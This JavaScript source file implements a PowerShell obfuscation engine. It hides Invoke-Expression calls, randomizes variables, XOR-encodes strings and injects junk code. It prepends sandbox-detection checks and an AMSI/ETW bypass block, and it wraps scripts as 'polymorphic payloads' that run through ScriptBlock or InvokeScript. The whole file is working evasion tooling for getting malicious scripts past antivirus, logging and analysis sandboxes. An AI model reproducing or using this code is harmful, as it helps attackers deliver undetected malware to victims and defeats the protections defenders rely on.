/**
 * PowerShell Obfuscation Engine (v2 — Context-Aware)
 *
 * FIXED:
 * - Removed string reverse [-1..-1] (breaks Unicode/Greek)
 * - Uses [char]0xXX and [System.Convert]::FromBase64String()
 * - Context-aware: only encodes string literals, never syntax
 * - Unicode detection → force Base64
 * - Dead code only injected at safe locations
 */

import { toBase64, xorEncryptForLanguage } from '../utils/encoding'
import { randomVarName, randomFuncName, generateDeadCode, randomXorKey } from '../utils/randomization'
import { tokenize, tokensToCode, transformStrings, transformCodeOnly, hasUnicode, hasInterpolation, splitInterpolatedString, isSafeForInjection } from '../utils/parser'
import { applyControlFlowFlattening } from './controlflow'
import { generatePSAmsiEtwBlock } from './amsi'

const IEX_STEALTH = '& ($ShellId[1]+$ShellId[13]+\'X\')'

export function obfuscatePowerShell(code, layers = []) {
  if (!code || code.trim().length === 0) return { code: '', stealthApplied: false }

  let result = code
  let stealthApplied = false

  // FIRST: Global IEX Stealth — replace ALL IEX/Invoke-Expression BEFORE any encoding
  const stealthResult = applyIEXStealth(result)
  result = stealthResult.code
  stealthApplied = stealthResult.applied

  if (layers.includes('randomize')) {
    result = applyVariableRandomization(result)
  }
  if (layers.includes('xorstrings')) {
    result = applyXorStringEncryption(result)
  }
  if (layers.includes('encode')) {
    result = applyStringEncoding(result)
  }
  if (layers.includes('controlflow')) {
    result = applyControlFlowFlattening(result, 'powershell')
  }
  if (layers.includes('deadcode')) {
    result = applyDeadCodeInjection(result)
  }
  if (layers.includes('antianalysis')) {
    result = applyAntiAnalysis(result)
  }
  if (layers.includes('amsietw')) {
    result = generatePSAmsiEtwBlock() + '\n' + result
  }
  if (layers.includes('encrypt')) {
    result = applyEncryptionWrapper(result)
  }

  return { code: result, stealthApplied }
}

/* ── Global IEX Stealth (runs FIRST, context-aware) ──────── */

function applyIEXStealth(code) {
  const iexPatterns = [
    /\bInvoke-Expression\b/gi,
    /\bIEX\s*\(/gi,
    /\biex\s*\(/gi,
    /\bIEX\b/gi,
    /\biex\b/gi,
  ]

  let applied = false

  // Only replace in CODE tokens, never inside strings
  const result = transformCodeOnly(code, 'powershell', (codeSegment) => {
    let segment = codeSegment
    for (const pattern of iexPatterns) {
      if (pattern.test(segment)) {
        applied = true
        // Handle IEX( and iex( — keep the opening paren
        segment = segment.replace(/\b[Ii][Ee][Xx]\s*\(/g, IEX_STEALTH + ' (')
        // Handle Invoke-Expression
        segment = segment.replace(/\bInvoke-Expression\b/gi, IEX_STEALTH)
        // Handle standalone IEX (not followed by paren, already handled above)
        segment = segment.replace(/\b[Ii][Ee][Xx]\b(?!\s*\()/g, IEX_STEALTH)
        break
      }
    }
    return segment
  })

  return { code: result, applied }
}

/* ── Variable Randomization (context-aware) ──────────────── */

function applyVariableRandomization(code) {
  const reserved = new Set([
    'null', 'true', 'false', 'args', 'input', 'PSCommandPath',
    'PSScriptRoot', 'MyInvocation', 'ErrorActionPreference', '_',
    'env', 'Host', 'PWD', 'HOME', 'PSVersionTable', 'LASTEXITCODE',
    'Error', 'Matches', 'ForEach', 'switch', 'process', 'begin', 'end',
  ])

  // First pass: collect variables from CODE tokens only
  const tokens = tokenize(code, 'powershell')
  const varMap = {}

  for (const token of tokens) {
    if (token.type !== 'code') continue
    const varPattern = /\$([a-zA-Z_][a-zA-Z0-9_]*)/g
    let match
    while ((match = varPattern.exec(token.value)) !== null) {
      const varName = match[1]
      if (!reserved.has(varName) && !reserved.has(varName.toLowerCase()) && !varMap[varName]) {
        varMap[varName] = randomVarName('short')
      }
    }
  }

  if (Object.keys(varMap).length === 0) return code

  const sortedVars = Object.keys(varMap).sort((a, b) => b.length - a.length)

  // Helper: rename $vars in a string
  const renameVarsInText = (text) => {
    let result = text
    for (const varName of sortedVars) {
      // $varName and ${varName}
      const regex = new RegExp('\\$' + varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\b', 'g')
      const braceRegex = new RegExp('\\$\\{' + varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\}', 'g')
      result = result.replace(braceRegex, '${' + varMap[varName] + '}')
      result = result.replace(regex, '$' + varMap[varName])
    }
    return result
  }

  // Second pass: replace in CODE tokens AND inside interpolated strings
  const transformed = tokens.map(token => {
    if (token.type === 'code') {
      return { ...token, value: renameVarsInText(token.value) }
    }
    // Rename inside double-quoted strings (PowerShell interpolates these)
    if (token.type === 'string' && token.quoteChar === '"') {
      const newValue = renameVarsInText(token.value)
      return { ...token, value: newValue, raw: `"${newValue}"` }
    }
    return token
  })

  return tokensToCode(transformed)
}

/* ── Encode a single static text segment for PowerShell ──── */

function encodeStaticPS(text) {
  if (!text) return ''
  if (hasUnicode(text)) {
    return `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${toBase64(text)}"))`
  }
  const method = Math.floor(Math.random() * 2)
  if (method === 0) {
    const chars = Array.from(text).map(c => `[char]0x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('+')
    return `(${chars})`
  }
  return `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${toBase64(text)}"))`
}

/* ── String Encoding (interpolation-aware, Unicode-safe) ─── */

function applyStringEncoding(code) {
  const tokens = tokenize(code, 'powershell')

  const transformed = transformStrings(tokens, (content, quoteChar) => {
    // Skip here-strings
    if (quoteChar === '@"' || quoteChar === "@'") {
      return `@${quoteChar[1]}${content}${quoteChar[1]}@`
    }
    // Skip single-quoted (literal)
    if (quoteChar === "'") {
      return `'${content}'`
    }

    // Check for variable interpolation
    if (hasInterpolation(content, 'powershell')) {
      const segments = splitInterpolatedString(content, 'powershell')
      const parts = segments.map(seg => {
        if (seg.type === 'var') return seg.value // Leave $var intact
        if (seg.value.length === 0) return ''
        return encodeStaticPS(seg.value)
      }).filter(p => p.length > 0)
      return `(${parts.join(' + ')})`
    }

    // No interpolation — encode entire string
    return encodeStaticPS(content)
  })

  return tokensToCode(transformed)
}

/* ── XOR String Encryption (Platinum) ────────────────────── */

function applyXorStringEncryption(code) {
  const funcName = randomFuncName()
  let helperInjected = false
  const tokens = tokenize(code, 'powershell')

  const transformed = transformStrings(tokens, (content, quoteChar) => {
    if (quoteChar === '@"' || quoteChar === "@'" || quoteChar === "'") {
      return quoteChar === "'" ? `'${content}'` : `@${quoteChar[1]}${content}${quoteChar[1]}@`
    }
    if (content.length < 3) return `"${content}"`

    // Interpolation-aware XOR: only encrypt static segments
    if (hasInterpolation(content, 'powershell')) {
      const segments = splitInterpolatedString(content, 'powershell')
      const parts = segments.map(seg => {
        if (seg.type === 'var') return seg.value
        if (seg.value.length < 3) return `"${seg.value}"`
        const xor = xorEncryptForLanguage(seg.value, 'powershell', funcName)
        if (!helperInjected) helperInjected = true
        return xor.inline
      }).filter(p => p.length > 0)
      return `(${parts.join(' + ')})`
    }

    const xor = xorEncryptForLanguage(content, 'powershell', funcName)
    if (!helperInjected) helperInjected = true
    return xor.inline
  })

  let result = tokensToCode(transformed)
  if (helperInjected) {
    const helper = xorEncryptForLanguage('x', 'powershell', funcName).helper
    result = helper + '\n' + result
  }
  return result
}

/* ── Dead Code Injection (safe locations only) ───────────── */

function applyDeadCodeInjection(code) {
  const lines = code.split('\n')
  const result = []

  for (let i = 0; i < lines.length; i++) {
    result.push(lines[i])
    if (i > 0 && i % (3 + Math.floor(Math.random() * 3)) === 0) {
      if (isSafeForInjection(lines[i], 'powershell')) {
        result.push(generateDeadCode('powershell'))
      }
    }
  }

  return result.join('\n')
}

/* ── Anti-Analysis ───────────────────────────────────────── */

function applyAntiAnalysis(code) {
  const v1 = randomVarName('short')
  const v2 = randomVarName('short')
  const v3 = randomVarName('short')
  const sleepMs = 1000 + Math.floor(Math.random() * 4000)

  const antiAnalysis = `# Environment validation
$${v1} = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
if ($${v1} -lt 2) { exit }
$${v2} = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory
if ($${v2} -lt 2GB) { exit }
$${v3} = [System.DateTime]::Now
Start-Sleep -Milliseconds ${sleepMs}
if (([System.DateTime]::Now - $${v3}).TotalMilliseconds -lt ${Math.floor(sleepMs * 0.8)}) { exit }
`

  return antiAnalysis + '\n' + code
}

/* ── Polymorphic Encryption Wrapper (v4.5) ───────────────── */

function psJunk() {
  const pool = [
    () => { const v = randomVarName('short'); return `$${v} = [int](${Math.floor(Math.random()*999)} * ${Math.floor(Math.random()*99)} + ${Math.floor(Math.random()*9999)}) % 256` },
    () => { const v = randomVarName('short'); return `$${v} = [System.BitConverter]::GetBytes(${Math.floor(Math.random()*0xFFFFFF)})` },
    () => { const v = randomVarName('short'); return `$${v} = "${Array.from({length: 6}, () => String.fromCharCode(65 + Math.floor(Math.random()*26))).join('')}"` },
    () => `[void]([Math]::Pow(${Math.floor(Math.random()*99)}, ${2 + Math.floor(Math.random()*3)}))`,
  ]
  return pool[Math.floor(Math.random() * pool.length)]()
}

function psLoopJunk(iv) {
  const pool = [
    () => `        [void]($${iv} * ${3 + Math.floor(Math.random()*17)} + ${Math.floor(Math.random()*255)})`,
    () => `        [void]($${iv} -bxor ${Math.floor(Math.random()*0xFF)})`,
  ]
  return pool[Math.floor(Math.random() * pool.length)]()
}

function psShuf(arr) {
  const a = [...arr]; for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]] }; return a
}

/* ── Stealth Invocation (v4.7) ───────────────────────────── */

function stealthInvoke(payloadExpr) {
  const pv = randomVarName('short')
  const methods = [
    // ScriptBlock::Create().Invoke()
    () => `$${pv} = ${payloadExpr}\n[ScriptBlock]::Create($${pv}).Invoke()`,
    // ExecutionContext.InvokeCommand
    () => `$${pv} = ${payloadExpr}\n$ExecutionContext.InvokeCommand.InvokeScript($${pv})`,
    // PowerShell API
    () => `$${pv} = ${payloadExpr}\n[PowerShell]::Create().AddScript($${pv}).Invoke()`,
  ]
  return methods[Math.floor(Math.random() * methods.length)]()
}

function applyEncryptionWrapper(code) {
  const m = Math.floor(Math.random() * 4)
  switch (m) {
    case 0: return psWrapperXorB64(code)
    case 1: return psWrapperHexShift(code)
    case 2: return psWrapperMultiXor(code)
    case 3: return psWrapperByteRot(code)
    default: return psWrapperXorB64(code)
  }
}

function psWrapperXorB64(code) {
  const key = randomXorKey(16)
  const b64 = toBase64(code)
  const xorData = Array.from(b64).map((c, i) => c.charCodeAt(0) ^ key[i % key.length])

  const dv = randomVarName('short'), kv = randomVarName('short')
  const fv = randomFuncName(), rv = randomVarName('short'), iv = randomVarName('short')

  const inits = psShuf([
    `$${kv} = @(${key.join(',')})`,
    `$${dv} = @(${xorData.join(',')})`,
    psJunk(), psJunk(),
  ])

  return `# Polymorphic payload
${inits.join('\n')}

function ${fv}($d, $k) {
    $${rv} = @()
    for ($${iv} = 0; $${iv} -lt $d.Length; $${iv}++) {
${psLoopJunk(iv)}
        $${rv} += [byte]($d[$${iv}] -bxor $k[$${iv} % $k.Length])
    }
    return [System.Text.Encoding]::ASCII.GetString($${rv})
}

${stealthInvoke(`[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${fv} $${dv} $${kv}))`)}
`
}

function psWrapperHexShift(code) {
  const shift = 3 + Math.floor(Math.random() * 25)
  const hexStr = Array.from(code).map(c => ((c.charCodeAt(0) + shift) % 256).toString(16).padStart(2, '0')).join('')

  const dv = randomVarName('short'), sv = randomVarName('short')
  const fv = randomFuncName(), rv = randomVarName('short')

  const inits = psShuf([`$${dv} = "${hexStr}"`, `$${sv} = ${shift}`, psJunk()])

  return `${inits.join('\n')}

function ${fv}($h, $s) {
    $${rv} = ""
    for ($i = 0; $i -lt $h.Length; $i += 2) {
${psLoopJunk('i')}
        $b = [Convert]::ToInt32($h.Substring($i, 2), 16)
        $${rv} += [char](($b - $s + 256) % 256)
    }
    return $${rv}
}

${stealthInvoke(`(${fv} $${dv} $${sv})`)}
`
}

function psWrapperMultiXor(code) {
  const k1 = randomXorKey(16), k2 = randomXorKey(16)
  const enc = Array.from(code).map((c, i) => (c.charCodeAt(0) ^ k1[i % k1.length]) ^ k2[i % k2.length])

  const dv = randomVarName('short'), k1v = randomVarName('short'), k2v = randomVarName('short')
  const fv = randomFuncName(), rv = randomVarName('short')

  const inits = psShuf([`$${dv} = @(${enc.join(',')})`, `$${k1v} = @(${k1.join(',')})`, `$${k2v} = @(${k2.join(',')})`, psJunk(), psJunk()])

  return `${inits.join('\n')}

function ${fv}($d, $a, $b) {
    $${rv} = ""
    for ($i = 0; $i -lt $d.Length; $i++) {
${psLoopJunk('i')}
        $${rv} += [char](($d[$i] -bxor $b[$i % $b.Length]) -bxor $a[$i % $a.Length])
    }
    return $${rv}
}

${stealthInvoke(`(${fv} $${dv} $${k1v} $${k2v})`)}
`
}

function psWrapperByteRot(code) {
  const rotN = 3 + Math.floor(Math.random() * 50)
  const b64 = toBase64(code)
  const rot = Array.from(b64).map(c => (c.charCodeAt(0) + rotN) % 256)

  const dv = randomVarName('short'), nv = randomVarName('short')
  const fv = randomFuncName(), rv = randomVarName('short')

  const inits = psShuf([`$${dv} = @(${rot.join(',')})`, `$${nv} = ${rotN}`, psJunk(), psJunk()])

  return `${inits.join('\n')}

function ${fv}($d, $n) {
    $${rv} = ""
    for ($i = 0; $i -lt $d.Length; $i++) {
${psLoopJunk('i')}
        $${rv} += [char](($d[$i] - $n + 256) % 256)
    }
    return $${rv}
}

${stealthInvoke(`[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${fv} $${dv} $${nv}))`)}
`
}
